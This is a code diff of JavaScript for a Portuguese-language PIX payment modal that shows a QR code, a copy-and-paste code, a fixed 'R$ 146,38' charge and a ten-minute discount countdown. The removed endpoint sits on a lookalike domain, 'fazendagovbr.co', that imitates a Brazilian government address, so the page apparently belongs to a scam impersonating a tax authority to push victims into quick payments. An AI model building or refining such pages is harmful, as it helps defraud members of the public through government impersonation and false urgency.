@@ -501,7 +501,7 @@ async function openPixModal(recaptchaToken) {
             valorTotal: valorTotal || ''
         };
 
-        const response = await fetch('https://seguir.fazendagovbr.co/generate-pix.php', {
+        const response = await fetch('../pix/generate-pix.php', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(customer)
@@ -597,113 +597,126 @@ function showPixModal(data) {
     if (existingModal) {
         existingModal.remove();
     }
-    
+
     const pixCode = data.pixCode || data.pix_code;
     const valorTotal = data.valorTotal || 'R$ 146,38';
-    
+
     if (!pixCode) {
         console.error('❌ Código PIX não encontrado na resposta da API');
         alert('Erro: Código PIX não recebido da API');
         return;
     }
-    
+
     console.log('🔍 Código PIX recebido:', pixCode);
-    
+
+    const transactionId = data.transaction_id || data.orderId || data.order_id;
+    console.log('🔍 Dados PIX recebidos:', data);
+    console.log('🆔 Transaction ID identificado:', transactionId);
+    if (transactionId) {
+        console.log('✅ Iniciando monitoramento de pagamento para:', transactionId);
+        startPaymentMonitoring(transactionId);
+    } else {
+        console.error('❌ Nenhum transaction_id encontrado nos dados:', data);
+    }
+
+    const modalHtml = `
+        <div id="pixModal" class="modal" style="display: flex; position: fixed; inset: 0; width: 100vw; height: 100vh; background-color: rgba(15, 23, 42, 0.75); z-index: 2000; align-items: center; justify-content: center; padding: 16px; box-sizing: border-box; animation: fadeIn 0.4s ease-out;">
+            <div class="modal-content" style="background: #ffffff; width: 100%; max-width: 420px; max-height: 90vh; border-radius: 18px; box-shadow: 0 20px 45px rgba(15, 23, 42, 0.45); padding: 22px 20px 20px 20px; overflow-y: auto; box-sizing: border-box; animation: slideDown 0.4s ease-out;">
+                <div style="text-align: center; margin-bottom: 20px;">
+                    <div id="pixQrSpinner" class="spinner" style="
+                        width: 40px;
+                        height: 40px;
+                        border: 4px solid #f3f3f3;
+                        border-top: 4px solid #044785;
+                        border-radius: 50%;
+                        animation: spin 1s linear infinite;
+                        margin: 0 auto 15px auto;
+                    "></div>
+                    <h2 style="color: #044785; font-weight: 600; margin-bottom: 6px; font-size: 1.25rem;">Aguardando pagamento PIX</h2>
+                    <p style="color: #64748b; font-size: 0.9rem;">Escaneie o QR Code ou use o código copia e cola</p>
+                </div>
+
+                <div id="pixDeadlineBox" style="background: #fff7ed; border: 1px solid #fdba74; border-radius: 12px; padding: 10px 12px; margin-bottom: 14px;">
+                    <div style="display: flex; align-items: center; justify-content: space-between; gap: 8px;">
+                        <span style="color: #9a3412; font-weight: 700; font-size: 0.84rem; letter-spacing: 0.2px;">Tempo para pagamento com desconto</span>
+                        <span id="pixCountdown" style="font-size: 1rem; font-weight: 800; color: #b45309;">10:00</span>
+                    </div>
+                    <div style="margin-top: 8px; width: 100%; height: 7px; border-radius: 999px; background: #fed7aa;">
+                        <div id="pixCountdownBar" style="height: 100%; width: 100%; border-radius: 999px; background: linear-gradient(90deg,#f59e0b,#fb923c); transition: width 1s linear;"></div>
+                    </div>
+                </div>
+
+                <div style="text-align: center; margin: 16px 0 18px 0;">
+                    <div style="display: inline-block; padding: 10px; background: white; border-radius: 16px; box-shadow: 0 8px 24px rgba(15,23,42,0.12);">
+                        <img id="pixQrImage" src="" alt="QR Code PIX" style="width: 180px; height: 180px; display: none;">
+                        <div id="pixQrPlaceholder" style="width: 180px; height: 180px; display: flex; align-items: center; justify-content: center; color: #94a3b8; font-size: 0.85rem;">Gerando QR Code...</div>
+                    </div>
+                </div>
+
+                <div style="background: #f8fafc; padding: 14px; border-radius: 12px; margin-bottom: 16px; border: 1px solid #e2e8f0;">
+                    <label style="display: block; margin-bottom: 8px; font-weight: 600; color: #0f172a; font-size: 0.9rem;">Código PIX (copia e cola) - Valor: ${valorTotal}</label>
+                    <div style="margin-bottom: 10px;">
+                        <textarea id="pixCodeInputDisplay" readonly style="width: 100%; height: 110px; padding: 12px; border: 1px solid #cbd5f1; border-radius: 8px; font-family: monospace; font-size: 0.82rem; resize: none; line-height: 1.35; word-wrap: break-word; color: #0f172a; background: #ffffff;">${pixCode}</textarea>
+                        <input type="hidden" id="pixCodeInputReal" value="${pixCode}">
+                    </div>
+                    <button onclick="copyPixCode()" style="width: 100%; padding: 11px 16px; background: linear-gradient(135deg,#16a34a,#22c55e); color: white; border: none; border-radius: 999px; cursor: pointer; font-weight: 600; font-size: 0.92rem; display: inline-flex; align-items: center; justify-content: center; gap: 8px;">
+                        <i class="fas fa-copy"></i><span>Copiar código PIX completo</span>
+                    </button>
+                </div>
+
+                <div style="background: #f1f5f9; padding: 12px 12px 10px 12px; border-radius: 10px; margin-top: 8px;">
+                    <div style="display: flex; align-items: flex-start; gap: 10px;">
+                        <div style="width: 26px; height: 26px; border-radius: 999px; background: #e0f2fe; display: flex; align-items: center; justify-content: center; flex-shrink: 0;">
+                            <i class="fas fa-info" style="color: #0369a1; font-size: 0.8rem;"></i>
+                        </div>
+                        <div style="color: #475569; font-size: 0.85rem; line-height: 1.4; text-align: left;">
+                            <p style="margin-bottom: 4px;"><strong>1.</strong> Copie o código PIX no botão acima ou aponte a câmera do seu banco para o QR Code.</p>
+                            <p style="margin-bottom: 4px;"><strong>2.</strong> Confirme o pagamento de <strong>${valorTotal}</strong> no app do seu banco.</p>
+                            <p style="margin: 0;"><strong>3.</strong> Após o pagamento, aguarde a confirmação automática nesta tela.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <button id="pixRegenerateButton" onclick="regeneratePixCode()" style="display: none; width: 100%; margin-top: 12px; padding: 11px 16px; background: linear-gradient(135deg,#044785,#1d4ed8); color: white; border: none; border-radius: 999px; cursor: pointer; font-weight: 700; font-size: 0.92rem;">
+                    Gerar novo código PIX
+                </button>
+
+            </div>
+        </div>
+        <style>
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        </style>
+    `;
+
+    document.body.insertAdjacentHTML('beforeend', modalHtml);
+    startPixCountdown(10 * 60);
+
     generateQRCodeFromPix(pixCode).then(qrCodeDataURL => {
         if (!qrCodeDataURL) {
             console.error('❌ Erro ao gerar QR Code');
-            alert('Erro ao gerar QR Code. Tente novamente.');
+            const placeholder = document.getElementById('pixQrPlaceholder');
+            if (placeholder) placeholder.textContent = 'Erro ao gerar QR Code';
             return;
         }
-        
         console.log('✅ QR Code gerado com sucesso');
-        
-        const transactionId = data.transaction_id || data.orderId || data.order_id;
-        console.log('🔍 Dados PIX recebidos:', data);
-        console.log('🆔 Transaction ID identificado:', transactionId);
-        if (transactionId) {
-            console.log('✅ Iniciando monitoramento de pagamento para:', transactionId);
-            startPaymentMonitoring(transactionId);
-        } else {
-            console.error('❌ Nenhum transaction_id encontrado nos dados:', data);
+        const img = document.getElementById('pixQrImage');
+        const placeholder = document.getElementById('pixQrPlaceholder');
+        const spinner = document.getElementById('pixQrSpinner');
+        if (img) {
+            img.src = qrCodeDataURL;
+            img.style.display = 'block';
         }
-        
-        const modalHtml = `
-            <div id="pixModal" class="modal" style="display: flex; position: fixed; inset: 0; width: 100vw; height: 100vh; background-color: rgba(15, 23, 42, 0.75); z-index: 2000; align-items: center; justify-content: center; padding: 16px; box-sizing: border-box; animation: fadeIn 0.4s ease-out;">
-                <div class="modal-content" style="background: #ffffff; width: 100%; max-width: 420px; max-height: 90vh; border-radius: 18px; box-shadow: 0 20px 45px rgba(15, 23, 42, 0.45); padding: 22px 20px 20px 20px; overflow-y: auto; box-sizing: border-box; animation: slideDown 0.4s ease-out;">
-                    <div style="text-align: center; margin-bottom: 20px;">
-                        <div class="spinner" style="
-                            width: 40px;
-                            height: 40px;
-                            border: 4px solid #f3f3f3;
-                            border-top: 4px solid #044785;
-                            border-radius: 50%;
-                            animation: spin 1s linear infinite;
-                            margin: 0 auto 15px auto;
-                        "></div>
-                        <h2 style="color: #044785; font-weight: 600; margin-bottom: 6px; font-size: 1.25rem;">Aguardando pagamento PIX</h2>
-                        <p style="color: #64748b; font-size: 0.9rem;">Escaneie o QR Code ou use o código copia e cola</p>
-                    </div>
-
-                    <div id="pixDeadlineBox" style="background: #fff7ed; border: 1px solid #fdba74; border-radius: 12px; padding: 10px 12px; margin-bottom: 14px;">
-                        <div style="display: flex; align-items: center; justify-content: space-between; gap: 8px;">
-                            <span style="color: #9a3412; font-weight: 700; font-size: 0.84rem; letter-spacing: 0.2px;">Tempo para pagamento com desconto</span>
-                            <span id="pixCountdown" style="font-size: 1rem; font-weight: 800; color: #b45309;">10:00</span>
-                        </div>
-                        <div style="margin-top: 8px; width: 100%; height: 7px; border-radius: 999px; background: #fed7aa;">
-                            <div id="pixCountdownBar" style="height: 100%; width: 100%; border-radius: 999px; background: linear-gradient(90deg,#f59e0b,#fb923c); transition: width 1s linear;"></div>
-                        </div>
-                    </div>
-
-                    <div style="text-align: center; margin: 16px 0 18px 0;">
-                        <div style="display: inline-block; padding: 10px; background: white; border-radius: 16px; box-shadow: 0 8px 24px rgba(15,23,42,0.12);">
-                            <img src="${qrCodeDataURL}" alt="QR Code PIX" style="width: 180px; height: 180px;">
-                        </div>
-                    </div>
-
-                    <div style="background: #f8fafc; padding: 14px; border-radius: 12px; margin-bottom: 16px; border: 1px solid #e2e8f0;">
-                        <label style="display: block; margin-bottom: 8px; font-weight: 600; color: #0f172a; font-size: 0.9rem;">Código PIX (copia e cola) - Valor: ${valorTotal}</label>
-                        <div style="margin-bottom: 10px;">
-                            <textarea id="pixCodeInputDisplay" readonly style="width: 100%; height: 110px; padding: 12px; border: 1px solid #cbd5f1; border-radius: 8px; font-family: monospace; font-size: 0.82rem; resize: none; line-height: 1.35; word-wrap: break-word; color: #0f172a; background: #ffffff;">${pixCode}</textarea>
-                            <input type="hidden" id="pixCodeInputReal" value="${pixCode}">
-                        </div>
-                        <button onclick="copyPixCode()" style="width: 100%; padding: 11px 16px; background: linear-gradient(135deg,#16a34a,#22c55e); color: white; border: none; border-radius: 999px; cursor: pointer; font-weight: 600; font-size: 0.92rem; display: inline-flex; align-items: center; justify-content: center; gap: 8px;">
-                            <i class="fas fa-copy"></i><span>Copiar código PIX completo</span>
-                        </button>
-                    </div>
-
-                    <div style="background: #f1f5f9; padding: 12px 12px 10px 12px; border-radius: 10px; margin-top: 8px;">
-                        <div style="display: flex; align-items: flex-start; gap: 10px;">
-                            <div style="width: 26px; height: 26px; border-radius: 999px; background: #e0f2fe; display: flex; align-items: center; justify-content: center; flex-shrink: 0;">
-                                <i class="fas fa-info" style="color: #0369a1; font-size: 0.8rem;"></i>
-                            </div>
-                            <div style="color: #475569; font-size: 0.85rem; line-height: 1.4; text-align: left;">
-                                <p style="margin-bottom: 4px;"><strong>1.</strong> Copie o código PIX no botão acima ou aponte a câmera do seu banco para o QR Code.</p>
-                                <p style="margin-bottom: 4px;"><strong>2.</strong> Confirme o pagamento de <strong>${valorTotal}</strong> no app do seu banco.</p>
-                                <p style="margin: 0;"><strong>3.</strong> Após o pagamento, aguarde a confirmação automática nesta tela.</p>
-                            </div>
-                        </div>
-                    </div>
-
-                    <button id="pixRegenerateButton" onclick="regeneratePixCode()" style="display: none; width: 100%; margin-top: 12px; padding: 11px 16px; background: linear-gradient(135deg,#044785,#1d4ed8); color: white; border: none; border-radius: 999px; cursor: pointer; font-weight: 700; font-size: 0.92rem;">
-                        Gerar novo código PIX
-                    </button>
-
-                </div>
-            </div>
-            <style>
-            @keyframes spin {
-                0% { transform: rotate(0deg); }
-                100% { transform: rotate(360deg); }
-            }
-            </style>
-        `;
-        
-        document.body.insertAdjacentHTML('beforeend', modalHtml);
-        startPixCountdown(10 * 60);
+        if (placeholder) placeholder.style.display = 'none';
+        if (spinner) spinner.style.display = 'none';
     }).catch(error => {
         console.error('❌ Erro ao gerar QR Code:', error);
-        alert('Erro ao gerar QR Code. Tente novamente.');
+        const placeholder = document.getElementById('pixQrPlaceholder');
+        if (placeholder) placeholder.textContent = 'Erro ao gerar QR Code';
+        const spinner = document.getElementById('pixQrSpinner');
+        if (spinner) spinner.style.display = 'none';
     });
 }
 
